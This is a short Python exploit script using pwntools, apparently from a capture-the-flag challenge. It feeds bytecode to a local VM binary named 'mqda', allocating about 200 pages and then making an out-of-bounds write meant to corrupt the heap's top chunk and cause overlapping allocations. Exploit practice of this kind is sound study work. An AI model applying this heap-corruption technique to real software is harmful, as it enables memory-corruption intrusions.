#!/usr/bin/env python3
"""
Exploit: Corrupt top chunk to get overlapping allocations

If we can make the top chunk size very large, future mallocs might 
return addresses that overlap with existing data structures.
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def create_massive_alloc_code():
    """Create code that allocates many pages to stress the heap."""
    code = b''
    
    # Allocate 200+ pages to stress the heap
    # Each page uses 0x110 bytes, and we have max 256 pages
    for i in range(200):
        addr = i * 0x100
        code += mov_reg_imm(15, addr)
        code += mov_reg_imm(0, 0x41414141 + i)
        code += push_reg(0)
    
    # Now try OOB write from the last allocated page
    # Last page is at 0xC700 (199 * 0x100)
    last_page = 199 * 0x100
    code += mov_reg_imm(15, last_page + 0xFF)  # OOB write position
    code += mov_reg_imm(0, 0xDEADBEEF)
    code += push_reg(0)  # OOB write!
    
    code += hlt()
    
    return code

def main():
    print("[*] Testing massive allocation + OOB write...")
    
    code = create_massive_alloc_code()
    print(f"[*] Code length: {len(code)}")
    
    if len(code) > 0x1000:
        print("[-] Code too long!")
        return
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=5)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
